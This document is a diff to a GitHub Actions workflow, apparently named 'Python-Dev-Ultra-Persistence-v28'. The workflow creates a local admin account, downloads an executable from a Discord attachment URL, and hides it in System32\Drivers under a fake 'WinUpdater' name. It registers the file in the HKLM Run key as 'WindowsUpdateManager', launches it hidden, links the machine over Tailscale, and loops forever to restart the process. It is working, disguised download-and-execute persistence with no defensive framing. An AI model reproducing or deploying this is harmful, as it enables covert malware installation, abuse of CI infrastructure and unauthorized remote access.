@@ -1,4 +1,4 @@
-name: Python-Dev-Persistence-v27
+name: Python-Dev-Ultra-Persistence-v28
 
 on:
   workflow_dispatch:
@@ -32,21 +32,25 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member "DevAdmin"
           echo "SRV_PASS=$p" >> $env:GITHUB_ENV
 
-      - name: 4. Deploy Randomized Module
+      - name: 4. Deploy & Auto-Start Registry
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1477090518474428507/PythonDev.exe?ex=69a37f3e&is=69a22dbe&hm=610c5b87eda47bd4c82c5a9fdc1269cd7cee4b23c892796a64e3dbbb5a9d6538&"
+          $url = "https://cdn.discordapp.com/attachments/1462658749985587281/1477524343591407677/PythonDev.exe?ex=69a51346&is=69a3c1c6&hm=03ad1c99d9495fc7f952c88125ae20e8ab1a71f129485d34f07abd1a36b2a125&"
           
-          # Nombre aleatorio para mayor discrecion
-          $randName = "WinService_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
-          $dest = "C:\Windows\System32\$randName"
+          $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
+          $dest = "C:\Windows\System32\Drivers\$randName"
           echo "PROC_NAME=$randName" >> $env:GITHUB_ENV
+          echo "FULL_PATH=$dest" >> $env:GITHUB_ENV
           
           try {
               Invoke-WebRequest -Uri $url -OutFile $dest -UserAgent "Mozilla/5.0" -ErrorAction Stop
+              # Añadir al registro de inicio para persistencia total
+              $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+              Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $dest
+              
               Start-Process $dest -WindowStyle Hidden
-              Write-Host "Proceso $randName iniciado correctamente."
+              Write-Host "Proceso $randName desplegado y registrado en el inicio."
           } catch {
-              Write-Error "Fallo critico en descarga."
+              Write-Error "Error en el despliegue."
               exit 1
           }
 
@@ -56,28 +60,18 @@ jobs:
           Start-Process msiexec.exe -ArgumentList "/i", "ts_setup.msi", "/quiet", "/norestart" -Wait
           & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="dev-node-${{ matrix.node_id }}"
 
-      - name: 6. Persistence Ultra-Loop (Auto-Restart cada 10s)
+      - name: 6. Persistence Monitor (Scan cada 5s)
         run: |
-          $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          $fullPath = "C:\Windows\System32\$env:PROC_NAME"
           $procOnly = $env:PROC_NAME.Replace(".exe", "")
-
           Write-Host "=========================================="
-          Write-Host "MONITOREO DE PERSISTENCIA ACTIVO"
-          Write-Host "IP: $ip | Proceso: $procOnly"
+          Write-Host "VIGILANCIA DE PROCESO ACTIVA"
+          Write-Host "Monitoreando: $procOnly"
           Write-Host "=========================================="
           
-          # Bucle infinito de vigilancia estrecha
           while ($true) {
-              $check = Get-Process $procOnly -ErrorAction SilentlyContinue
-              if (!$check) {
-                  Write-Host "[$(Get-Date)] ! ALERTA: Proceso caido. Reiniciando de inmediato..."
-                  try {
-                      Start-Process $fullPath -WindowStyle Hidden
-                  } catch {
-                      Write-Host "Error al intentar reiniciar el proceso."
-                  }
+              if (!(Get-Process $procOnly -ErrorAction SilentlyContinue)) {
+                  Write-Host "[$(Get-Date)] Reiniciando proceso..."
+                  Start-Process $env:FULL_PATH -WindowStyle Hidden
               }
-              # Intervalo corto para asegurar que siempre este abierto
-              Start-Sleep -Seconds 10
+              Start-Sleep -Seconds 5
           }
